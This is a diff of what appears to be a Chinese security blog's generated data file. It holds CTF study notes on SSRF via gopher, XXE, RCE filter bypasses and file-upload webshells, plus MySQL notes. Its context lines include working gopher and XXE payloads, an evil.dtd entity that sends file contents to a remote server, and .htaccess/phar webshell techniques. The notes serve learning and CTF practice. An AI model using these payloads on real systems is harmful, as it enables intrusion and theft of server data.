@@ -1032,7 +1032,7 @@
 
 <h2 id="固定会话攻击"><a href="#固定会话攻击" class="headerlink" title="固定会话攻击"></a>固定会话攻击</h2><p>前面已经提到：用于标识会话的SessionID是个随机值，攻击者是没有办法进行猜测的。</p>
 <p>但是在一些场景中，攻击者可以诱导用户使用攻击者指定的SessionID，当受害者登录成功后，这个SessionID就关联了受害者的身份，相当于攻击者拥有了受害者在目标网站上的身份。这种攻击就叫固定会话攻击，如图所示：</p>
-<img src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202408051405220.jpg" alt="微信图片_20240805140524">
+<img src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202408051405220.jpg" alt="微信图片_20240805140524"  />
 
 
 
@@ -1590,7 +1590,7 @@
 <ul>
 <li><p>如果你是linux系统使用cat,是windows系统使用type.</p>
 </li>
-<li><p>如果你是windows那你利用ssh密钥连接运行ssh -i id_rsa <a href="mailto:&#114;&#x6f;&#x6f;&#x74;&#64;&#49;&#x39;&#x32;&#46;&#x31;&#54;&#56;&#x2e;&#x34;&#51;&#x2e;&#49;&#x34;&#49;">&#114;&#x6f;&#x6f;&#x74;&#64;&#49;&#x39;&#x32;&#46;&#x31;&#54;&#56;&#x2e;&#x34;&#51;&#x2e;&#49;&#x34;&#49;</a>需要在.ssh目录下，因为权限问题。</p>
+<li><p>如果你是windows那你利用ssh密钥连接运行ssh -i id_rsa <a href="mailto:&#114;&#x6f;&#x6f;&#116;&#x40;&#x31;&#x39;&#50;&#46;&#49;&#x36;&#56;&#46;&#x34;&#51;&#x2e;&#x31;&#x34;&#x31;">&#114;&#x6f;&#x6f;&#116;&#x40;&#x31;&#x39;&#50;&#46;&#49;&#x36;&#56;&#46;&#x34;&#51;&#x2e;&#x31;&#x34;&#x31;</a>需要在.ssh目录下，因为权限问题。</p>
 </li>
 <li><p>你利用redis上传公钥时候运行代码是在你解压的redis文件下运行。</p>
 </li>
@@ -3531,11 +3531,11 @@
 <h3 id="删除视图"><a href="#删除视图" class="headerlink" title="删除视图"></a>删除视图</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">VIEW</span> 视图名;</span><br></pre></td></tr></table></figure>
 
 <h3 id="视图的检查条件"><a href="#视图的检查条件" class="headerlink" title="视图的检查条件"></a>视图的检查条件</h3><p><img src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202407151652065.png"></p>
-<h2 id="ER图"><a href="#ER图" class="headerlink" title="ER图"></a>ER图</h2><p><img src="/posts/3243020805/1.png"></p>
+<h2 id="ER图"><a href="#ER图" class="headerlink" title="ER图"></a>ER图</h2><p><img src="/mysql-review/1.png"></p>
 <h2 id="数据模型"><a href="#数据模型" class="headerlink" title="数据模型"></a>数据模型</h2><p>层次模型、网状模型、<strong>关系模型</strong>、面向对象模型</p>
 <h2 id="数据库设计"><a href="#数据库设计" class="headerlink" title="数据库设计"></a>数据库设计</h2><p>数据库设计分为<strong>6个阶段：</strong><br>需求分析、概念数据库设计、逻辑数据库设计、物理数据库设计、数据库实施、数据库运行和维护</p>
 <h3 id="数据库范式"><a href="#数据库范式" class="headerlink" title="数据库范式"></a>数据库范式</h3><p><strong>第一范式</strong>遵从原子性，属性不可再分<br><strong>第二范式</strong>遵从唯一性，非主键字段需完全依赖主键<br><strong>第三范式</strong>就是非主键字段不能相互依赖</p>
-<h2 id="部分数据类型"><a href="#部分数据类型" class="headerlink" title="部分数据类型"></a>部分数据类型</h2><p><img src="/posts/3243020805/4.png"></p>
+<h2 id="部分数据类型"><a href="#部分数据类型" class="headerlink" title="部分数据类型"></a>部分数据类型</h2><p><img src="/mysql-review/4.png"></p>
 <h2 id="用户管理"><a href="#用户管理" class="headerlink" title="用户管理"></a>用户管理</h2><h3 id="创建用户"><a href="#创建用户" class="headerlink" title="创建用户"></a>创建用户</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">USER</span> <span class="string">&#x27;用户名&#x27;</span>@<span class="string">&#x27;主机&#x27;</span> IDENTIFIED <span class="keyword">BY</span> <span class="string">&#x27;密码&#x27;</span>;</span><br></pre></td></tr></table></figure>
 
 <h3 id="删除用户"><a href="#删除用户" class="headerlink" title="删除用户"></a>删除用户</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">USER</span> <span class="string">&#x27;用户名&#x27;</span>@<span class="string">&#x27;主机&#x27;</span>;</span><br></pre></td></tr></table></figure>
@@ -3562,7 +3562,7 @@
 <h3 id="一致性（Consistency）"><a href="#一致性（Consistency）" class="headerlink" title="一致性（Consistency）"></a>一致性（Consistency）</h3><p>事务执行前后，数据库的状态保持一致，遵循数据库的完整性约束。</p>
 <h3 id="隔离性（Isolation）"><a href="#隔离性（Isolation）" class="headerlink" title="隔离性（Isolation）"></a>隔离性（Isolation）</h3><p>一个事务的执行不会被其他事务干扰，事务之间相互独立。</p>
 <h3 id="持久性（Durability）"><a href="#持久性（Durability）" class="headerlink" title="持久性（Durability）"></a>持久性（Durability）</h3><p>事务一旦提交，对数据库的改变是永久性的，即使系统崩溃也不会丢失。</p>
-<h2 id="MySQL的四种隔离级别"><a href="#MySQL的四种隔离级别" class="headerlink" title="MySQL的四种隔离级别"></a>MySQL的四种隔离级别</h2><p><img src="/posts/3243020805/2.png"></p>
+<h2 id="MySQL的四种隔离级别"><a href="#MySQL的四种隔离级别" class="headerlink" title="MySQL的四种隔离级别"></a>MySQL的四种隔离级别</h2><p><img src="/mysql-review/2.png"></p>
 <h3 id="读未提交（Read-Uncommitted）"><a href="#读未提交（Read-Uncommitted）" class="headerlink" title="读未提交（Read Uncommitted）"></a>读未提交（Read Uncommitted）</h3><p>最低的隔离级别，允许脏读（Dirty Read），一个事务可以读到另一个事务未提交的数据。</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SET</span> SESSION TRANSACTION ISOLATION LEVEL READ UNCOMMITTED;</span><br></pre></td></tr></table></figure>
 
@@ -3589,7 +3589,7 @@
 
 <h3 id="删除存储过程"><a href="#删除存储过程" class="headerlink" title="删除存储过程"></a>删除存储过程</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">PROCEDURE</span> IF <span class="keyword">EXISTS</span> 存储过程名;</span><br></pre></td></tr></table></figure>
 
-<h2 id="书本练习"><a href="#书本练习" class="headerlink" title="书本练习"></a>书本练习</h2><p><img src="/posts/3243020805/5.png"><br><img src="/posts/3243020805/6.png"><br><img src="/posts/3243020805/7.png"><br><img src="/posts/3243020805/8.png"><br><img src="/posts/3243020805/9.png"><br><img src="/posts/3243020805/10.png"><br><img src="/posts/3243020805/11.png"><br><img src="/posts/3243020805/12.png"><br><img src="/posts/3243020805/13.png"><br><img src="/posts/3243020805/14.png"><br><img src="/posts/3243020805/15.png"><br><img src="/posts/3243020805/16.png"><br><img src="/posts/3243020805/17.png"><br><img src="/posts/3243020805/18.png"><br><img src="/posts/3243020805/19.png"><br><img src="/posts/3243020805/20.png"></p>
+<h2 id="书本练习"><a href="#书本练习" class="headerlink" title="书本练习"></a>书本练习</h2><p><img src="/mysql-review/5.png"><br><img src="/mysql-review/6.png"><br><img src="/mysql-review/7.png"><br><img src="/mysql-review/8.png"><br><img src="/mysql-review/9.png"><br><img src="/mysql-review/10.png"><br><img src="/mysql-review/11.png"><br><img src="/mysql-review/12.png"><br><img src="/mysql-review/13.png"><br><img src="/mysql-review/14.png"><br><img src="/mysql-review/15.png"><br><img src="/mysql-review/16.png"><br><img src="/mysql-review/17.png"><br><img src="/mysql-review/18.png"><br><img src="/mysql-review/19.png"><br><img src="/mysql-review/20.png"></p>
 ]]></content>
       <tags>
         <tag>期末复习</tag>
@@ -3664,13 +3664,13 @@
 <p>1、路径：<code>GET /flag.php HTTP/1.1</code></p>
 <p>2、目标地址：<code>Host: 127.0.0.1</code></p>
 <p><code>gopher://127.0.0.1:80/_GET%20/flag.php%0d%0AHTTP/1.1%0d%0AHost:%20127.0.0.1%0d%0AConnection: Close%0d%0A%0d%0A</code></p>
-<p><font color="red">注意：</font><br>添加端口号80和填充位<br>URL编码：<br>    空格 ：<code>%20</code><br>    问号 ：<code>%3f</code><br>    换行符 ： <code>%0d%0A</code></p>
+<p><font color='red'>注意：</font><br>添加端口号80和填充位<br>URL编码：<br>    空格 ：<code>%20</code><br>    问号 ：<code>%3f</code><br>    换行符 ： <code>%0d%0A</code></p>
 <p>1、问号(?)需要转码为URL编码，也就是%3f<br>2、回车换行要变为%0D%0A,但如果直接用工具转，可能只会有%0A<br>3、在HTTP包的最后要加%0D%0A（换行符），代表消息结束(具体可研究HTTP包结束)<br>4、URL编码改为大写,冒号注意英文冒号<br>5、如果使用<strong>BP发包需要进行两次url编码</strong><br>6、GET提交<strong>最后需要增加一个换行符</strong><br><br></p>
 <h4 id="gopher伪协议实现POST提交"><a href="#gopher伪协议实现POST提交" class="headerlink" title="gopher伪协议实现POST提交"></a>gopher伪协议实现POST提交</h4><p>需要保留头部信息：POST、Host、Content-Type、Content-Length</p>
 <p>将下面保留的内容进行<strong>两次URL编码</strong>：</p>
 <figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="variable constant_">POST</span> /name.php <span class="variable constant_">HTTP</span>/<span class="number">1.1</span></span><br><span class="line"><span class="title class_">Host</span><span class="symbol">:</span><span class="number">172.250</span>.<span class="number">250.4</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Type</span><span class="symbol">:application/x-www-form-urlencoded</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Length</span><span class="symbol">:</span><span class="number">8</span></span><br><span class="line"> </span><br><span class="line">name=<span class="number">123</span></span><br></pre></td></tr></table></figure>
 
-<p><font color="red">注意：</font><br>1、POST后面是要提交的文件名<br>2、Host为目标主机<br>3、类型要和提交的类型一致<br>4、长度为下面提交内容的具体长度<br>5、中间的空行不能少<br>6、<strong>回车换行要变为%0D%0A</strong>,但如果直接用工具转，可能只会有%0A  </p>
+<p><font color='red'>注意：</font><br>1、POST后面是要提交的文件名<br>2、Host为目标主机<br>3、类型要和提交的类型一致<br>4、长度为下面提交内容的具体长度<br>5、中间的空行不能少<br>6、<strong>回车换行要变为%0D%0A</strong>,但如果直接用工具转，可能只会有%0A  </p>
 <p>无论是GET提交还是POST提交，gopher的格式是不变的：<br><code>gopher://172.250.250.4:80/_编码后的内容粘贴至此</code><br><br></p>
 <h4 id="CTFHub技能树："><a href="#CTFHub技能树：" class="headerlink" title="CTFHub技能树："></a>CTFHub技能树：</h4><p>1、输入<code>?url=file:///var/www/html/flag.php</code>得到以下代码</p>
 <figure class="highlight php-template"><table><tr><td class="code"><pre><span class="line"><span class="language-php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="language-php"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span></span><br><span class="line"><span class="language-php"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>] != <span class="string">&quot;127.0.0.1&quot;</span>) &#123;</span></span><br><span class="line"><span class="language-php">    <span class="keyword">echo</span> <span class="string">&quot;Just View From 127.0.0.1&quot;</span>;</span></span><br><span class="line"><span class="language-php">    <span class="keyword">return</span>;</span></span><br><span class="line"><span class="language-php">&#125;</span></span><br><span class="line"><span class="language-php"><span class="variable">$flag</span>=<span class="title function_ invoke__">getenv</span>(<span class="string">&quot;CTFHUB&quot;</span>);</span></span><br><span class="line"><span class="language-php"><span class="variable">$key</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$flag</span>);</span></span><br><span class="line"><span class="language-php"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;key&quot;</span>]) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&quot;key&quot;</span>] == <span class="variable">$key</span>) &#123;</span></span><br><span class="line"><span class="language-php">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span></span><br><span class="line"><span class="language-php">    <span class="keyword">exit</span>;</span></span><br><span class="line"><span class="language-php">&#125;</span></span><br><span class="line"><span class="language-php"><span class="meta">?&gt;</span></span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/flag.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;key&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="comment">&lt;!-- De<span class="doctag">bug:</span> key=</span></span><span class="language-php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$key</span>;<span class="meta">?&gt;</span></span><span class="language-xml"><span class="comment">--&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
@@ -3835,7 +3835,7 @@
 <p>2、这里是一个基础的 XXE 外部实体注入场景，登录的时候用户提交的 XML 数据，且服务器后端对 XML 数据解析并将结果输出，所以可以构造一个 XXE <strong>读取本地的敏感信息：（file:&#x2F;&#x2F;&#x2F;etc&#x2F;hosts）</strong></p>
 <figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">user</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/hosts&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">password</span>&gt;</span>123<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="/posts/1355767420/Users\zm\AppData\Roaming\Typora\typora-user-images\image-20240901201718534.png" alt="image-20240901201718534"></p>
+<p><img src="C:\Users\zm\AppData\Roaming\Typora\typora-user-images\image-20240901201718534.png" alt="image-20240901201718534"></p>
 <p>3、payload：<code>gopher://172.72.23.25:80/_POST%2520/doLogin.php%2520HTTP/1.1%250D%250AHost%253A%2520172.72.23.25%250D%250AContent-Type%253A%2520application/xml%253Bcharset%253Dutf-8%250D%250AContent-Length%253A%2520172%250D%250AConnection%253A%2520close%250D%250A%250D%250A%253C%253Fxml%2520version%253D%25221.0%2522%2520encoding%253D%2522UTF-8%2522%253F%253E%250D%250A%253C%2521DOCTYPE%2520user%2520%255B%250D%250A%253C%2521ENTITY%2520xxe%2520SYSTEM%2520%2522file%253A///etc/hosts%2522%2520%253E%255D%253E%250D%250A%253Cuser%253E%250D%250A%253Cusername%253E%2526xxe%253B%253C/username%253E%250D%250A%253Cpassword%253E123%253C/password%253E%250D%250A%253C/user%253E</code></p>
 <p><img src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202409012016654.png" alt="image-20240901201611592"></p>
 <br>
@@ -3958,7 +3958,7 @@
 
 <p>远程服务器的evil.dtd文件内容（evil.dtd内部的%号要进行实体编码成&amp;#x25。）：  </p>
 <figure class="highlight mojolicious"><table><tr><td class="code"><pre><span class="line"><span class="language-xml"><span class="meta">&lt;!ENTITY % <span class="keyword">all</span></span></span></span><br><span class="line"><span class="meta"><span class="language-xml">    <span class="string">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://远程服务器ip/?data=%file;&#x27;&gt;&quot;</span></span></span></span><br><span class="line"><span class="meta"><span class="language-xml">&gt;</span></span></span><br><span class="line"><span class="language-xml"></span><span class="language-perl">%all;</span></span><br></pre></td></tr></table></figure>
-<p><font color="red">执行流程：</font><br>1、php过滤器将flag进行base64编码后赋值给<code>%file</code>实体<br>2、解析<code>%dtd</code>时，将会访问远程服务器的<code>evil.dtd</code>文件<br>3、在<code>evil.dtd</code>内解析<code>%all</code>实体时，会将<code>%file</code>实体带入<br>4、通过访问指定的链接，将数据赋给<code>%send</code><br>5、访问接受数据的服务器中的日志信息，可以看到数据。<br><br></p>
+<p><font color=red>执行流程：</font><br>1、php过滤器将flag进行base64编码后赋值给<code>%file</code>实体<br>2、解析<code>%dtd</code>时，将会访问远程服务器的<code>evil.dtd</code>文件<br>3、在<code>evil.dtd</code>内解析<code>%all</code>实体时，会将<code>%file</code>实体带入<br>4、通过访问指定的链接，将数据赋给<code>%send</code><br>5、访问接受数据的服务器中的日志信息，可以看到数据。<br><br></p>
 <h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>XXE漏洞造成命令执行很少见，要求在php环境下，xml要装有expect扩展，然而该扩展默认是没有安装的,所以这里不进行讲解。<br><br></p>
 <h3 id="内网探测"><a href="#内网探测" class="headerlink" title="内网探测"></a>内网探测</h3><p>这里其实和读取文件类似，只不过文件地址变成了url</p>
 <figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version = <span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">test</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY f <span class="keyword">SYSTEM</span> <span class="string">&quot;http://127.0.0.1/flag.php&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">test</span>&gt;</span><span class="symbol">&amp;f;</span><span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br></pre></td></tr></table></figure>
@@ -4092,7 +4092,7 @@
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">action</span>(<span class="params">arg</span>):</span><br><span class="line">    s1 = <span class="string">&quot;&quot;</span></span><br><span class="line">    s2 = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">        f = <span class="built_in">open</span>(<span class="string">&quot;res.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            t = f.readline()</span><br><span class="line">            <span class="keyword">if</span> t == <span class="string">&quot;&quot;</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> t[<span class="number">0</span>] == i:</span><br><span class="line">                <span class="comment"># print(i)</span></span><br><span class="line">                s1 += t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">                s2 += t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        f.close()</span><br><span class="line">    output = <span class="string">&quot;(\&quot;&quot;</span> + s1 + <span class="string">&quot;\&quot;^\&quot;&quot;</span> + s2 + <span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">    <span class="keyword">return</span> (output)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    param = action(<span class="built_in">input</span>(<span class="string">&quot;\n[+] your function：&quot;</span>)) + action(<span class="built_in">input</span>(<span class="string">&quot;[+] your command：&quot;</span>)) + <span class="string">&quot;;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(param)</span><br></pre></td></tr></table></figure>
 <p><img src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202407151638582.png"><br><br></p>
 <h2 id="绕过（要求输入数字时）"><a href="#绕过（要求输入数字时）" class="headerlink" title="$(())绕过（要求输入数字时）"></a>$(())绕过（要求输入数字时）</h2><p>1、在Linux里，$(())代表0。<br><strong>对于正整数和0，取反的结果是其本身加1的负数，对于负整数，取反的结果是其本身加1的绝对值。</strong><br><img src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202407151630185.png"></p>
-<p>2、例如LitCTF-百万美元的诱惑中要求我们输入12这个数，虽然过滤了很多符号，但是我们可以使用$(())绕过，12就是13个<code>$((~$(())))</code>再进行一次取反<br><img src="/posts/2308381537/4.png"></p>
+<p>2、例如LitCTF-百万美元的诱惑中要求我们输入12这个数，虽然过滤了很多符号，但是我们可以使用$(())绕过，12就是13个<code>$((~$(())))</code>再进行一次取反<br><img src="/CTF-RCE/4.png"></p>
 <p>3、这里我们使用python脚本进行构造：</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Invert_Num = <span class="string">&#x27;$(( ~$((&#123;&#125;)) ))&#x27;</span>  <span class="comment"># 取反操作</span></span><br><span class="line">Num1 = <span class="string">&#x27;$((~$(()))) &#x27;</span>  <span class="comment">#-1</span></span><br><span class="line">payload = Invert_Num.<span class="built_in">format</span>(Num1*<span class="number">13</span>)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure>
 <p><img src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202407151638011.png"><br><br></p>
@@ -4283,7 +4283,8 @@
 
 
 
-<h1 id="PHP-Trick"><a href="#PHP-Trick" class="headerlink" title="PHP_Trick"></a>PHP_Trick</h1><h2 id="php原生类"><a href="#php原生类" class="headerlink" title="php原生类"></a>php原生类</h2><ul>
+<h1 id="PHP-Trick"><a href="#PHP-Trick" class="headerlink" title="PHP_Trick"></a>PHP_Trick</h1><p>下面列举一些php的常用技巧</p>
+<h2 id="php原生类"><a href="#php原生类" class="headerlink" title="php原生类"></a>php原生类</h2><ul>
 <li><p><strong>文件可遍历目录类：</strong></p>
 <p>DirectoryIterator 类</p>
 <p>FilesystemIterator 类</p>
@@ -4294,6 +4295,98 @@
 </li>
 </ul>
 <br>
+
+
+
+<h2 id="PHP-preg-系列"><a href="#PHP-preg-系列" class="headerlink" title="PHP preg_系列"></a>PHP preg_系列</h2><h3 id="preg-match"><a href="#preg-match" class="headerlink" title="preg_match"></a>preg_match</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> <span class="title function_ invoke__">preg_match</span> ( <span class="keyword">string</span> <span class="variable">$pattern</span> , <span class="keyword">string</span> <span class="variable">$subject</span> [, <span class="keyword">array</span> &amp;<span class="variable">$matches</span> [, <span class="keyword">int</span> <span class="variable">$flags</span> = <span class="number">0</span> [, <span class="keyword">int</span> <span class="variable">$offset</span> = <span class="number">0</span> ]]] )</span><br></pre></td></tr></table></figure>
+
+<p>preg_match 函数用于执行一个正则表达式匹配</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><em>$pattern</em></td>
+<td>要搜索的模式，字符串形式。</td>
+</tr>
+<tr>
+<td><em>$subject</em></td>
+<td>要搜索检测的目标字符串</td>
+</tr>
+<tr>
+<td><em>$matches</em></td>
+<td>如果提供了参数 matches，它将被填充为搜索结果 $matches [0] 将包含完整模式匹配到的文本， $matches [1] 将包含第一个捕获子组匹配到的文本，以此类推。</td>
+</tr>
+<tr>
+<td><em>$flags</em></td>
+<td>可设置标记值，详细用法参考</td>
+</tr>
+<tr>
+<td><em>$offset</em></td>
+<td>可选参数 offset 用于指定从目标字符串的某个未知开始搜索 (单位是字节)。</td>
+</tr>
+</tbody></table>
+<br>
+
+
+
+<h3 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace"></a>preg_replace</h3><p>preg_replace — 执行一个正则表达式的搜索和替换</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">preg_replace</span> ( <span class="keyword">mixed</span> <span class="variable">$pattern</span> , <span class="keyword">mixed</span> <span class="variable">$replacement</span> , <span class="keyword">mixed</span> <span class="variable">$subject</span> [, <span class="keyword">int</span> <span class="variable">$limit</span> = -<span class="number">1</span> [, <span class="keyword">int</span> &amp;<span class="variable">$count</span> ]] ) : <span class="keyword">mixed</span></span><br></pre></td></tr></table></figure>
+
+<p>搜索 <code>subject</code> 中匹配 <code>pattern</code> 的部分， 以 <code>replacement</code> 进行替换。</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><em>$pattern</em></td>
+<td>要搜索的模式，可以是字符串或一个字符串数组</td>
+</tr>
+<tr>
+<td><em>$replacement</em></td>
+<td>用于替换的字符串或字符串数组</td>
+</tr>
+<tr>
+<td><em>$subject</em></td>
+<td>要搜索替换的目标字符串或字符串数组</td>
+</tr>
+<tr>
+<td><em>$limit</em></td>
+<td>可选，对于每个模式用于每个 subject 字符串的最大可替换次数。 默认是 - 1（无限制）</td>
+</tr>
+<tr>
+<td><em>$count</em></td>
+<td>可选，为替换执行的次数</td>
+</tr>
+</tbody></table>
+<p><strong>返回值：</strong></p>
+<p>如果 <code>subject</code> 是一个数组， <strong>preg_replace ()</strong> 返回一个数组， 其他情况下返回一个字符串。</p>
+<p>如果匹配被查找到，替换后的 <code>subject</code> 被返回，其他情况下 返回没有改变的 <code>subject</code>。如果发生错误，返回 <strong><code>NULL</code></strong> </p>
+<br>
+
+
+
+<h3 id="两者的区别"><a href="#两者的区别" class="headerlink" title="两者的区别"></a>两者的区别</h3><ul>
+<li><code>preg_match</code>函数接受三个参数：正则表达式模式、要匹配的字符串和一个可选的标志位。<strong>它返回一个布尔值，表示是否找到了匹配的模式。</strong></li>
+<li><code>preg_replace</code>函数也接受三个参数：正则表达式模式、要替换的字符串以及替换后的字符串或一个回调函数。<strong>它会遍历整个字符串，找到所有匹配的模式，并将它们替换为指定的字符串或由回调函数返回的结果。</strong></li>
+</ul>
+<br>
+
+
+
+<h3 id="修饰符（preg-match）"><a href="#修饰符（preg-match）" class="headerlink" title="修饰符（preg_match）"></a>修饰符（preg_match）</h3><br>
+
+
+
+<h3 id="修饰符（preg-replace）"><a href="#修饰符（preg-replace）" class="headerlink" title="修饰符（preg_replace）"></a>修饰符（preg_replace）</h3><br>
+
+
 
 
 
@@ -5067,7 +5160,7 @@ https://blog.csdn.net/2301_76690905/article/details/134533626
 
 <p><strong>白名单的绕过方法</strong>简单概括：<br>1、结合解析漏洞<br>2、截断上传<br>3、文件名长度绕过<br>4、.htaccess文件上传<br>5、上传zip马结合文件包含<br><br></p>
 <h4 id="配置文件上传-htaccess-user-ini"><a href="#配置文件上传-htaccess-user-ini" class="headerlink" title="配置文件上传(.htaccess &#x2F; .user.ini)"></a>配置文件上传(.htaccess &#x2F; .user.ini)</h4><p><code>.htaccess：</code><br>.htaccess是Apache Web服务器上的一个配置文件，用于配置服务器的行为，如URL重写、访问控制、重定向等。<br>其中.htaccess文件内容：SetHandler application&#x2F;x-http-php的意思是设置当前目录所有文件都使用php解析，那么无论上传任何文件，只要符合php语言代码规范，就会被当做PHP执行。不符合规则则报错</p>
-<p>但.htaccess文件可用的前提是管理员在http.conf文件中设置 AllowOverried All。<br><img src="/posts/154257042/5.png"></p>
+<p>但.htaccess文件可用的前提是管理员在http.conf文件中设置 AllowOverried All。<br><img src="/upload/5.png"></p>
 <p>如果代码没有对htaccess进行过滤，那么可以直接上传.htaccess来设置使用php解析任意文件。<br>创建txt文件输入以下代码，然后改为1.jpg,上传时抓包将filename改回.htaccess即可</p>
 <figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line"><span class="string">//</span> <span class="string">&quot;\.jpg&quot;</span>为要上传的shell的文件名</span><br><span class="line">&lt;FilesMatch <span class="string">&quot;\.jpg&quot;</span>&gt; </span><br><span class="line">  SetHandler application/x-httpd-php</span><br><span class="line">&lt;<span class="string">/FilesMatch</span>&gt;</span><br></pre></td></tr></table></figure>
 <p>上传成功后再将图片马上传就可以连接蚁剑了</p>
@@ -5108,7 +5201,7 @@ https://blog.csdn.net/2301_76690905/article/details/134533626
 
 
 <h4 id="上传zip马结合文件包含"><a href="#上传zip马结合文件包含" class="headerlink" title="上传zip马结合文件包含"></a>上传zip马结合文件包含</h4><p>在白名单内只允许上传zip文件时，可以将php文件放入zip内，注意压缩方式为<strong>存储</strong>。<br><img src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202407151636307.png"></p>
-<p>在上传zip文件后，使用文件包含伪协议进行运行<br>zip:&#x2F;&#x2F; （压缩流）<br>phar:&#x2F;&#x2F; （PHP归档)<br>    <a href="http://127.0.0.1/include.php?file=zip://uploads/phpinfo.zip%23phpinfo">http://127.0.0.1/include.php?file=zip://uploads/phpinfo.zip%23phpinfo</a><br>    <a href="http://127.0.0.1/include.php?file=phar://./uploads/phpinfo.zip/phpinfo">http://127.0.0.1/include.php?file=phar://./uploads/phpinfo.zip/phpinfo</a><br>其中phpinfo.zip是所上传的压缩包，phpinfo是压缩包内的文件名，如果源代码中没有include <strong>php</strong>后缀的话，需要在伪协议代码后自行添加.php<br>如果include 的是jpg后缀，那么将压缩包内的文件也对应改成jpg即可<br><img src="/posts/154257042/4.png"><br><br></p>
